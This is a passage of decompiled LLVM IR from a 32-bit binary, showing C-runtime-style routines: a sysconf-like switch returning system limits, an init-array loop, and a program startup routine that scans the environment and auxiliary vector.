    i32 86, label %dec_label_pc_804c744
    i32 87, label %dec_label_pc_804c721
    i32 88, label %dec_label_pc_804c6b5
    i32 89, label %dec_label_pc_804c6bf
    i32 90, label %dec_label_pc_804c736
    i32 91, label %dec_label_pc_804c645
    i32 92, label %dec_label_pc_804c645
    i32 93, label %dec_label_pc_804c645
    i32 94, label %dec_label_pc_804c645
    i32 95, label %dec_label_pc_804c71a
    i32 96, label %dec_label_pc_804c744
    i32 97, label %dec_label_pc_804c744
    i32 98, label %dec_label_pc_804c645
    i32 99, label %dec_label_pc_804c645
    i32 100, label %dec_label_pc_804c645
    i32 101, label %dec_label_pc_804c6c9
    i32 102, label %dec_label_pc_804c70c
    i32 103, label %dec_label_pc_804c749
    i32 104, label %dec_label_pc_804c721
    i32 105, label %dec_label_pc_804c6d3
    i32 106, label %dec_label_pc_804c72f
    i32 107, label %dec_label_pc_804c72f
    i32 108, label %dec_label_pc_804c713
    i32 109, label %dec_label_pc_804c750
    i32 110, label %dec_label_pc_804c76c
    i32 111, label %dec_label_pc_804c70c
    i32 112, label %dec_label_pc_804c749
    i32 113, label %dec_label_pc_804c76c
    i32 114, label %dec_label_pc_804c6dd
    i32 115, label %dec_label_pc_804c765
    i32 116, label %dec_label_pc_804c744
    i32 117, label %dec_label_pc_804c744
    i32 118, label %dec_label_pc_804c6e7
    i32 119, label %dec_label_pc_804c6f1
    i32 120, label %dec_label_pc_804c75e
    i32 121, label %dec_label_pc_804c721
    i32 122, label %dec_label_pc_804c721
    i32 123, label %dec_label_pc_804c721
    i32 124, label %dec_label_pc_804c721
    i32 125, label %dec_label_pc_804c645
    i32 126, label %dec_label_pc_804c645
    i32 127, label %dec_label_pc_804c744
    i32 128, label %dec_label_pc_804c744
    i32 129, label %dec_label_pc_804c645
    i32 130, label %dec_label_pc_804c645
    i32 131, label %dec_label_pc_804c744
    i32 149, label %dec_label_pc_804c6f8
  ]

dec_label_pc_804c645:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c64f:                             ; preds = %dec_label_pc_804c630
  %v1_804c64f = call i32 @function_804b330(i32 ptrtoint (i32* @0 to i32))
  %v1_804c654 = inttoptr i32 %v1_804c64f to i32*
  store i32 22, i32* %v1_804c654, align 4
  br label %dec_label_pc_804c744

dec_label_pc_804c65f:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c669:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c673:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c67d:                             ; preds = %dec_label_pc_804c630
  %v0_804c680 = call i32 @function_804aec8()
  br label %dec_label_pc_804c685

dec_label_pc_804c685:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c67d
  br label %dec_label_pc_804c771

dec_label_pc_804c68f:                             ; preds = %dec_label_pc_804c630
  %v0_804c692 = call i32 @function_804cdf3()
  br label %dec_label_pc_804c697

dec_label_pc_804c697:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c68f
  br label %dec_label_pc_804c771

dec_label_pc_804c6a1:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c6ab:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c6b5:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c6bf:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c6c9:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c6d3:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c6dd:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c6e7:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c6f1:                             ; preds = %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c6f8:                             ; preds = %dec_label_pc_804c630
  %v5_804c6fe = call i32 @function_804cb84(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804c706 = icmp slt i32 %v5_804c6fe, 0
  %v1_804c708 = icmp eq i1 %v2_804c706, false
  br i1 %v1_804c708, label %dec_label_pc_804c71a, label %dec_label_pc_804c744

dec_label_pc_804c70c:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c713:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c71a:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c6f8
  br label %dec_label_pc_804c771

dec_label_pc_804c721:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c728:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c72f:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c736:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c73d:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c744:                             ; preds = %dec_label_pc_804c6f8, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c64f
  br label %dec_label_pc_804c771

dec_label_pc_804c749:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c750:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c757:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c75e:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c765:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c76c:                             ; preds = %dec_label_pc_804c630, %dec_label_pc_804c630, %dec_label_pc_804c630
  br label %dec_label_pc_804c771

dec_label_pc_804c771:                             ; preds = %dec_label_pc_804c71a, %dec_label_pc_804c6f1, %dec_label_pc_804c6e7, %dec_label_pc_804c6dd, %dec_label_pc_804c6d3, %dec_label_pc_804c6c9, %dec_label_pc_804c6bf, %dec_label_pc_804c6b5, %dec_label_pc_804c6ab, %dec_label_pc_804c6a1, %dec_label_pc_804c697, %dec_label_pc_804c685, %dec_label_pc_804c673, %dec_label_pc_804c669, %dec_label_pc_804c65f, %dec_label_pc_804c645, %dec_label_pc_804c765, %dec_label_pc_804c75e, %dec_label_pc_804c757, %dec_label_pc_804c750, %dec_label_pc_804c749, %dec_label_pc_804c73d, %dec_label_pc_804c736, %dec_label_pc_804c72f, %dec_label_pc_804c728, %dec_label_pc_804c721, %dec_label_pc_804c713, %dec_label_pc_804c70c, %dec_label_pc_804c744, %dec_label_pc_804c76c
  %v0_804c774 = phi i32 [ 200112, %dec_label_pc_804c71a ], [ 9, %dec_label_pc_804c6f1 ], [ 65535, %dec_label_pc_804c6e7 ], [ -32768, %dec_label_pc_804c6dd ], [ -2147483648, %dec_label_pc_804c6d3 ], [ 8, %dec_label_pc_804c6c9 ], [ 500, %dec_label_pc_804c6bf ], [ 4096, %dec_label_pc_804c6b5 ], [ 16384, %dec_label_pc_804c6ab ], [ 1000, %dec_label_pc_804c6a1 ], [ 32768, %dec_label_pc_804c697 ], [ 6, %dec_label_pc_804c685 ], [ 65536, %dec_label_pc_804c673 ], [ 100, %dec_label_pc_804c669 ], [ 131072, %dec_label_pc_804c65f ], [ 1, %dec_label_pc_804c645 ], [ 255, %dec_label_pc_804c765 ], [ 2048, %dec_label_pc_804c75e ], [ 99, %dec_label_pc_804c757 ], [ 20, %dec_label_pc_804c750 ], [ -128, %dec_label_pc_804c749 ], [ 1024, %dec_label_pc_804c73d ], [ 4, %dec_label_pc_804c736 ], [ 32, %dec_label_pc_804c72f ], [ 256, %dec_label_pc_804c728 ], [ 2147483647, %dec_label_pc_804c721 ], [ 16, %dec_label_pc_804c713 ], [ 127, %dec_label_pc_804c70c ], [ -1, %dec_label_pc_804c744 ], [ 32767, %dec_label_pc_804c76c ]
  ret i32 %v0_804c774

; uselistorder directives
  uselistorder i32 256, { 9, 1, 2, 0, 10, 18, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 8 }
  uselistorder i32 1024, { 0, 6, 7, 8, 9, 10, 11, 4, 1, 5, 2, 3 }
  uselistorder i32 2048, { 4, 1, 5, 6, 7, 8, 2, 0, 3 }
  uselistorder i32 255, { 0, 1, 2, 4, 3 }
  uselistorder i32 65536, { 16, 17, 0, 1, 3, 2, 4, 5, 6, 7, 9, 8, 13, 10, 14, 11, 15, 12 }
  uselistorder i32 1000, { 1, 0 }
  uselistorder i32 16384, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 15, 16 }
  uselistorder i32 500, { 1, 0 }
  uselistorder i32 ()* @function_804aec8, { 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 116, { 7, 5, 2, 1, 6, 3, 4, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 100, { 3, 23, 13, 14, 9, 10, 7, 8, 19, 11, 12, 6, 4, 5, 20, 21, 22, 15, 24, 16, 17, 18, 25, 2, 1, 26, 0, 27 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 96, { 2, 3, 0, 1 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 0, 2, 3, 1 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 84, { 5, 10, 7, 1, 2, 6, 11, 12, 9, 8, 3, 4, 0 }
  uselistorder i32 80, { 1, 2, 0 }
  uselistorder i32 74, { 1, 0 }
  uselistorder i32 68, { 2, 0, 1 }
  uselistorder i32 60, { 2, 0, 1 }
  uselistorder i32 59, { 2, 0, 1 }
  uselistorder i32 55, { 2, 0, 1 }
  uselistorder i32 34, { 2, 0, 1 }
  uselistorder i32 29, { 3, 1, 2, 0 }
  uselistorder i32 27, { 3, 1, 2, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 25, { 1, 2, 3, 0 }
  uselistorder i32 21, { 1, 0 }
  uselistorder i32 17, { 6, 3, 5, 1, 2, 0, 7, 8, 10, 9, 4 }
  uselistorder i32 13, { 3, 0, 5, 4, 6, 1, 2 }
  uselistorder i32 9, { 1, 9, 0, 7, 12, 6, 5, 2, 11, 10, 3, 13, 4, 8 }
  uselistorder i32 7, { 5, 0, 1, 7, 8, 6, 9, 10, 11, 3, 4, 2 }
  uselistorder i32 6, { 0, 9, 2, 3, 1, 13, 4, 11, 10, 12, 6, 7, 8, 5 }
  uselistorder i32 5, { 6, 17, 18, 1, 9, 10, 11, 7, 12, 0, 13, 14, 2, 15, 16, 4, 8, 5, 3 }
  uselistorder label %dec_label_pc_804c771, { 29, 16, 17, 18, 19, 20, 28, 21, 22, 23, 24, 25, 0, 26, 27, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_804c744, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804c71a, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804c697, { 1, 0 }
  uselistorder label %dec_label_pc_804c685, { 1, 0 }
}

define i32 @function_804c775() local_unnamed_addr {
dec_label_pc_804c775:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c775 = load i32, i32* @ebx, align 4
  store i32 %v0_804c775, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), i32 -134542780), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), i32 -134542780), i32 2), i32 0), label %dec_label_pc_804c789, label %dec_label_pc_804c796

dec_label_pc_804c789:                             ; preds = %dec_label_pc_804c775, %dec_label_pc_804c789
  %v1_804c7908 = phi i32 [ %v1_804c790, %dec_label_pc_804c789 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_804f5bc.104 to i32), i32 -134542780), i32 2), i32 -1), %dec_label_pc_804c775 ]
  store i32 ptrtoint (i32* @global_var_804c790.105 to i32), i32* %stack_var_-16, align 4
  %v5_804c789 = mul i32 %v1_804c7908, 4
  %v6_804c789 = add i32 %v5_804c789, ptrtoint (i32* @global_var_804f5bc.104 to i32)
  %v7_804c789 = inttoptr i32 %v6_804c789 to i32*
  %v8_804c789 = load i32, i32* %v7_804c789, align 4
  call void @__pseudo_call(i32 %v8_804c789)
  %v0_804c790.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c790 = add i32 %v0_804c790.pre, -1
  store i32 %v1_804c790, i32* %ebx.global-to-local, align 4
  %v10_804c791 = icmp eq i32 %v0_804c790.pre, 0
  %v1_804c794 = icmp eq i1 %v10_804c791, false
  br i1 %v1_804c794, label %dec_label_pc_804c789, label %dec_label_pc_804c796

dec_label_pc_804c796:                             ; preds = %dec_label_pc_804c789, %dec_label_pc_804c775
  %v0_804c796 = load i32, i32* @global_var_804f6c8.106, align 8
  %v1_804c79b = icmp eq i32 %v0_804c796, 0
  br i1 %v1_804c79b, label %dec_label_pc_804c7a1, label %dec_label_pc_804c79f

dec_label_pc_804c79f:                             ; preds = %dec_label_pc_804c796
  %v0_804c79f = load i32, i32* %stack_var_-16, align 4
  %v1_804c79f = call i32 @unknown_0(i32 %v0_804c79f)
  br label %dec_label_pc_804c7a1

dec_label_pc_804c7a1:                             ; preds = %dec_label_pc_804c79f, %dec_label_pc_804c796
  %v0_804c7a1 = load i32, i32* @global_var_804f6cc.107, align 4
  %v1_804c7a7 = icmp eq i32 %v0_804c7a1, 0
  br i1 %v1_804c7a7, label %dec_label_pc_804c7b0, label %dec_label_pc_804c7ab

dec_label_pc_804c7ab:                             ; preds = %dec_label_pc_804c7a1
  %v2_804c7ab = load i32, i32* %stack_var_-16, align 4
  %v1_804c7ae = call i32 @unknown_0(i32 %v2_804c7ab)
  br label %dec_label_pc_804c7b0

dec_label_pc_804c7b0:                             ; preds = %dec_label_pc_804c7ab, %dec_label_pc_804c7a1
  %v2_804c7b0 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_804c7b0

; uselistorder directives
  uselistorder i32 %v1_804c790, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804c789, { 1, 0 }
}

define i32 @function_804c7b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c7b4:
  ret i32 0
}

define i32 @function_804c7b7(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804c7b7:
  %v0_804c7b7 = load i32, i32* @eax, align 4
  ret i32 %v0_804c7b7
}

define i32 @function_804c7b8() local_unnamed_addr {
dec_label_pc_804c7b8:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_804c7b8 = load i32, i32* @esi, align 4
  %v0_804c7b9 = load i32, i32* @eax, align 4
  store i32 %v0_804c7b9, i32* @esi, align 4
  %v0_804c7bb = load i32, i32* @ebx, align 4
  %v0_804c7bc = load i32, i32* @edx, align 4
  store i32 %v0_804c7bc, i32* @ebx, align 4
  %v4_804c7c4 = call i32 @function_804adb0(i32 %v0_804c7b9, i32 1, i32 %tmp6)
  %v8_804c7cc = icmp eq i32 %v4_804c7c4, -1
  %v1_804c7cd = icmp eq i1 %v8_804c7cc, false
  br i1 %v1_804c7cd, label %dec_label_pc_804c7e8, label %dec_label_pc_804c7cf

dec_label_pc_804c7cf:                             ; preds = %dec_label_pc_804c7b8
  %v0_804c7d1 = load i32, i32* @ebx, align 4
  %v6_804c7d7 = call i32 @function_804af9d(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_804e5ac.108, i32 0, i32 0), i32 %v0_804c7d1)
  %v1_804c7df = load i32, i32* @esi, align 4
  %v12_804c7df = icmp eq i32 %v6_804c7d7, %v1_804c7df
  br i1 %v12_804c7df, label %dec_label_pc_804c7e8, label %dec_label_pc_804c7e3

dec_label_pc_804c7e3:                             ; preds = %dec_label_pc_804c7cf
  %v0_804c7e3 = call i32 @function_804c32f()
  br label %dec_label_pc_804c7e8

dec_label_pc_804c7e8:                             ; preds = %dec_label_pc_804c7cf, %dec_label_pc_804c7b8, %dec_label_pc_804c7e3
  %v2_804c7e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804c7bb, i32* @ebx, align 4
  store i32 %v0_804c7b8, i32* @esi, align 4
  ret i32 %v2_804c7e8

; uselistorder directives
  uselistorder i32 ()* @function_804c32f, { 0, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @function_804af9d, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @function_804adb0, { 0, 1, 9, 8, 5, 4, 7, 6, 3, 2 }
  uselistorder label %dec_label_pc_804c7e8, { 2, 0, 1 }
}

define i32 @function_804c7ec() local_unnamed_addr {
dec_label_pc_804c7ec:
  %v0_804c7ef = load i8, i8* @global_var_804f6d0.109, align 16
  %v1_804c7ef = icmp eq i8 %v0_804c7ef, 0
  %v1_804c7f6 = icmp eq i1 %v1_804c7ef, false
  br i1 %v1_804c7f6, label %dec_label_pc_804c7ec.dec_label_pc_804c828_crit_edge, label %dec_label_pc_804c7f8

dec_label_pc_804c7ec.dec_label_pc_804c828_crit_edge: ; preds = %dec_label_pc_804c7ec
  %v0_804c82b.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804c828

dec_label_pc_804c7f8:                             ; preds = %dec_label_pc_804c7ec
  store i8 1, i8* @global_var_804f6d0.109, align 16
  store i32 4096, i32* @global_var_804f6c4.110, align 4
  br label %dec_label_pc_804c828

dec_label_pc_804c828:                             ; preds = %dec_label_pc_804c7ec.dec_label_pc_804c828_crit_edge, %dec_label_pc_804c7f8
  %v0_804c82b = phi i32 [ %v0_804c82b.pre, %dec_label_pc_804c7ec.dec_label_pc_804c828_crit_edge ], [ 0, %dec_label_pc_804c7f8 ]
  ret i32 %v0_804c82b

; uselistorder directives
  uselistorder i8 1, { 16, 1, 15, 9, 10, 4, 3, 11, 2, 12, 13, 5, 7, 6, 0, 14, 8 }
  uselistorder i8 0, { 76, 75, 65, 66, 67, 68, 69, 70, 71, 72, 30, 73, 54, 5, 41, 46, 45, 6, 42, 43, 8, 44, 7, 55, 39, 40, 9, 56, 10, 47, 0, 48, 11, 57, 12, 53, 16, 49, 17, 15, 3, 50, 52, 31, 4, 18, 19, 51, 26, 27, 28, 29, 20, 21, 22, 23, 24, 25, 2, 58, 59, 1, 60, 61, 14, 62, 63, 13, 64, 74, 77, 78, 38, 32, 33, 34, 35, 36, 37 }
  uselistorder i8* @global_var_804f6d0.109, { 1, 0 }
  uselistorder label %dec_label_pc_804c828, { 1, 0 }
}

define i32 @function_804c82c(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804c82c:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp43 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp43, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_804f6bc.111, align 4
  store i32 %arg6, i32* @global_var_804f6cc.107, align 4
  %v2_804c863 = mul i32 %arg2, 4
  %v3_804c863 = add i32 %tmp43, %v2_804c863
  %v1_804c866 = add i32 %v3_804c863, 4
  store i32 %v1_804c866, i32* @global_var_804f6c0.112, align 64
  %v3_804c86f = load i32, i32* %arg3, align 4
  %v14_804c86f = icmp eq i32 %v1_804c866, %v3_804c86f
  store i32 0, i32* %stack_var_-168, align 4
  %v1_804c875 = icmp eq i1 %v14_804c86f, false
  %v4_804c875 = select i1 %v1_804c875, i32 %v1_804c866, i32 %v3_804c863
  store i32 %v4_804c875, i32* @global_var_804f6c0.112, align 64
  %v2_804c87d = ptrtoint i32* %stack_var_-136 to i32
  %v3_804c882 = bitcast i32* %stack_var_-136 to i8*
  %v4_804c882 = call i32 @function_804b381(i8* %v3_804c882, i32 0, i32 120)
  %v0_804c887 = load i32, i32* @global_var_804f6c0.112, align 64
  br label %dec_label_pc_804c88f

dec_label_pc_804c88f:                             ; preds = %dec_label_pc_804c88f, %dec_label_pc_804c82c
  %v0_804c88f = phi i32 [ %v1_804c892, %dec_label_pc_804c88f ], [ %v0_804c887, %dec_label_pc_804c82c ]
  %v1_804c88f = inttoptr i32 %v0_804c88f to i32*
  %v2_804c88f = load i32, i32* %v1_804c88f, align 4
  %v3_804c88f = icmp eq i32 %v2_804c88f, 0
  %v1_804c892 = add i32 %v0_804c88f, 4
  %v1_804c895 = icmp eq i1 %v3_804c88f, false
  br i1 %v1_804c895, label %dec_label_pc_804c88f, label %dec_label_pc_804c8b6.preheader

dec_label_pc_804c8b6.preheader:                   ; preds = %dec_label_pc_804c88f
  store i32 %v1_804c892, i32* @ebx, align 4
  %v1_804c8b622 = inttoptr i32 %v1_804c892 to i32*
  %v2_804c8b623 = load i32, i32* %v1_804c8b622, align 4
  %v3_804c8b624 = icmp eq i32 %v2_804c8b623, 0
  %v1_804c8b926 = icmp eq i1 %v3_804c8b624, false
  br i1 %v1_804c8b926, label %dec_label_pc_804c89b.lr.ph, label %dec_label_pc_804c8bb

dec_label_pc_804c89b.lr.ph:                       ; preds = %dec_label_pc_804c8b6.preheader
  %v3_804c873 = ptrtoint i32* %stack_var_-168 to i32
  %v3_804c8a6 = add i32 %v3_804c873, 32
  br label %dec_label_pc_804c89b

dec_label_pc_804c89b:                             ; preds = %dec_label_pc_804c89b.lr.ph, %dec_label_pc_804c8b3
  %v1_804c8a6 = phi i32 [ %v2_804c8b623, %dec_label_pc_804c89b.lr.ph ], [ %v2_804c8b6, %dec_label_pc_804c8b3 ]
  %v0_804c8a5 = phi i32 [ %v1_804c892, %dec_label_pc_804c89b.lr.ph ], [ %v1_804c8b3, %dec_label_pc_804c8b3 ]
  %v6_804c8a0 = icmp ugt i32 %v1_804c8a6, 14
  br i1 %v6_804c8a0, label %dec_label_pc_804c8b3, label %dec_label_pc_804c8a2

dec_label_pc_804c8a2:                             ; preds = %dec_label_pc_804c89b
  store i32 %v0_804c8a5, i32* %stack_var_-168, align 4
  %v2_804c8a6 = mul i32 %v1_804c8a6, 8
  %v4_804c8a6 = add i32 %v3_804c8a6, %v2_804c8a6
  %v3_804c8ab = inttoptr i32 %v4_804c8a6 to i16*
  %v4_804c8ab = call i32 @function_804d032(i16* %v3_804c8ab, i32 %v0_804c8a5, i32 8)
  %v0_804c8b3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c8b3

dec_label_pc_804c8b3:                             ; preds = %dec_label_pc_804c89b, %dec_label_pc_804c8a2
  %v0_804c8b3 = phi i32 [ %v0_804c8a5, %dec_label_pc_804c89b ], [ %v0_804c8b3.pre, %dec_label_pc_804c8a2 ]
  %v1_804c8b3 = add i32 %v0_804c8b3, 8
  store i32 %v1_804c8b3, i32* @ebx, align 4
  %v1_804c8b6 = inttoptr i32 %v1_804c8b3 to i32*
  %v2_804c8b6 = load i32, i32* %v1_804c8b6, align 4
  %v3_804c8b6 = icmp eq i32 %v2_804c8b6, 0
  %v1_804c8b9 = icmp eq i1 %v3_804c8b6, false
  br i1 %v1_804c8b9, label %dec_label_pc_804c89b, label %dec_label_pc_804c8bb

dec_label_pc_804c8bb:                             ; preds = %dec_label_pc_804c8b3, %dec_label_pc_804c8b6.preheader
  store i32 %v2_804c87d, i32* @eax, align 4
  %v0_804c8bf = call i32 @function_804d071()
  store i32 %v0_804c8bf, i32* @eax, align 4
  %v0_804c8c4 = call i32 @function_804c7ec()
  %v1_804c8d2 = icmp eq i32 %tmp38, 0
  %v3_804c8d4 = select i1 %v1_804c8d2, i32 4096, i32 %tmp38
  %v13_804c8d7 = icmp eq i32 %tmp37, -1
  store i32 %v3_804c8d4, i32* @global_var_804f6c4.110, align 4
  %v1_804c8e1 = icmp eq i1 %v13_804c8d7, false
  br i1 %v1_804c8e1, label %dec_label_pc_804c90c, label %dec_label_pc_804c8e3

dec_label_pc_804c8e3:                             ; preds = %dec_label_pc_804c8bb
  %v0_804c8e3 = call i32 @function_804ce04()
  store i32 %v0_804c8e3, i32* @ebx, align 4
  %v0_804c8ea = call i32 @function_804cda7()
  %v0_804c8ef = load i32, i32* @ebx, align 4
  %v12_804c8ef = icmp eq i32 %v0_804c8ef, %v0_804c8ea
  %v1_804c8f1 = icmp eq i1 %v12_804c8ef, false
  br i1 %v1_804c8f1, label %dec_label_pc_804c922, label %dec_label_pc_804c8f3

dec_label_pc_804c8f3:                             ; preds = %dec_label_pc_804c8e3
  %v0_804c8f3 = call i32 @function_804cdcd()
  store i32 %v0_804c8f3, i32* @ebx, align 4
  %v0_804c8fa = call i32 @function_804cd81()
  %v0_804c8ff = load i32, i32* @ebx, align 4
  %v12_804c8ff = icmp eq i32 %v0_804c8ff, %v0_804c8fa
  %v1_804c901 = icmp eq i1 %v12_804c8ff, false
  br i1 %v1_804c901, label %dec_label_pc_804c922, label %dec_label_pc_804c903.thread

dec_label_pc_804c903.thread:                      ; preds = %dec_label_pc_804c8f3
  br label %dec_label_pc_804c94c

dec_label_pc_804c90c:                             ; preds = %dec_label_pc_804c8bb
  %v15_804c90c = icmp eq i32 %tmp37, %tmp36
  %v1_804c910 = icmp eq i1 %v15_804c90c, false
  br i1 %v1_804c910, label %dec_label_pc_804c922, label %dec_label_pc_804c912

dec_label_pc_804c912:                             ; preds = %dec_label_pc_804c90c
  br label %dec_label_pc_804c922

dec_label_pc_804c922:                             ; preds = %dec_label_pc_804c912, %dec_label_pc_804c90c, %dec_label_pc_804c8f3, %dec_label_pc_804c8e3
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804c929 = call i32 @function_804c7b8()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804c938 = call i32 @function_804c7b8()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804c947 = call i32 @function_804c7b8()
  br label %dec_label_pc_804c94c

dec_label_pc_804c94c:                             ; preds = %dec_label_pc_804c903.thread, %dec_label_pc_804c922
  %v0_804c94c = load i32, i32* @edi, align 4
  %v1_804c94c = inttoptr i32 %v0_804c94c to i32*
  %v2_804c94c = load i32, i32* %v1_804c94c, align 4
